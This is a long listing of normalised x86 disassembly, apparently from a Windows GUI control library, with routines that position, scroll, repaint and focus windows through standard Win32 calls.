je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_43b724
test eax eax
jne r-xdata
sub_43ff38
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e9d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ff58
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e9d8
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ff8c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e9d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ffac
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_43fffc
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_440020
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43983c
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_43da88
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_43da4c
mov dl [ esp ]
mov si 0xffd1
call sub_403394
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_440078
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403394
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44009c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403394
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4400d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c1f8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_43dae8
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_43e2f8
sub_44010c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403394
pop esi
pop ebx
retn
mov eax ebx
call sub_43abb4
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4043a8
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4043a8
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_44018c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e6d8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43c2cc
sub_4401ec
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43e44c
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_43d848
pop ebx
retn
sub_44021c
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_440244
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_44105c
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_43d848
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_4402b4
push ebx
mov ebx eax
mov eax ebx
call sub_43c138
mov eax ebx
call sub_44105c
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_43dae8
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41ce38
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_43b724
sub_4402f0
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_438e1c
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_440d58
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_43b724
sub_440330
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44105c
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_440d58
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_440370
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_43dae8
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44105c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_440c60
sub_4403b0
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_440e98
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_440e98
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_440410
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_43b180
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_43a0b4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43e644
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_440480
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c270
mov edx esi
mov eax ebx
call sub_43daa8
pop esi
pop ebx
retn
sub_44049c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_437458
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_451710
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403394
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403394
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403394
test al al
jne r-xdata
sub_440530
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_441e10
mov edx esi
mov eax ebx
call sub_44049c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43b724
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_43b724
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43b724
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_451710
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43b724
test eax eax
jne r-xdata
jmp r-xdata
sub_440614
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_43b724
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_440668
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43b724
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_451710
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43b724
test eax eax
jne r-xdata
sub_4406b4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_44049c
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43b724
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_451710
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43b724
test eax eax
jne r-xdata
sub_440710
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_451710
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43b724
mov [ esi + 0xc ] eax
sub_440744
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_44105c
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44105c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_439bc4
mov eax ebx
mov si 0xffd0
call sub_403394
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_439f10
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44081c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_43da88
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_43da4c
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403394
inc edi
dec ebx
jne r-xdata
sub_440864
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43d5f0
xor eax eax
push ebp
push sub_440902
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44081c
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43a18c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440909
mov eax [ ebp - 0x4 ]
call sub_43d5f8
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_440910
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_43da88
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_43d618
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_43da4c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_440a00
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_4140f4
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_413f38
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_414114
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_414098
call sub_440d58
jmp r-xdata
mov eax ebp
mov edx esi
call sub_414098
call sub_440d58
sub_440ad8
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_440a00
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_440b38
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_440d58
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_440d58
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
test eax eax
jne r-xdata
sub_440b9c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44105c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_43b724
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
mov eax ebx
call sub_43da88
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_43da4c
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_43da4c
test [ eax + 0x52 ] 0x4
je r-xdata
sub_440c60
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_439f10
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_440c98
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_451710
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_440cd8
push ebx
mov ebx eax
mov eax ebx
call sub_451710
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_45547c
pop ebx
retn
mov eax ebx
call sub_451738
mov eax ebx
call sub_440d58
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_440d10
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_440d34
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_440d34
sub_440d6c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_412be0
mov eax edi
call sub_43da88
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_43da4c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_440e00
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_440d58
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_440e38
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44105c
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_440d58
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403394
sub_440ef4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_4140f4
pop esi
pop ebx
retn
sub_440f18
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_440ef4
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_413f38
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_414114
sub_440f8c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_44105c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_43b724
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_440fec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_441050
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441057
lea eax [ ebp - 0x4 ]
call sub_405634
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403394
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_40564c
sub_441068
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_439bc4
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_441120
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_414098
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_413eec
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403394
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_441180
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_441276
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403394
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44127d
mov eax [ ebp - 0x14 ]
call sub_403198
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4140f4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
